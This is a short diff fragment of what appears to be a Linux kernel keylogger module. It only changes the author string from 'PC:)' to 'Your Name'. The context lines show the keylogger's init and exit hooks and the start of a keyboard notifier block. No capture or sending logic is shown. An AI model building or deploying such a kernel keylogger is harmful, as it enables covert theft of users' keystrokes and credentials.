@@ -57,7 +57,7 @@ static void __exit keylogger_exit(void) {
 module_init(keylogger_init);
 module_exit(keylogger_exit);
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("PC:)");
+MODULE_AUTHOR("Your Name");
 
 static struct notifier_block keylogger_nb = {
     .notifier_call = keylogger_notify
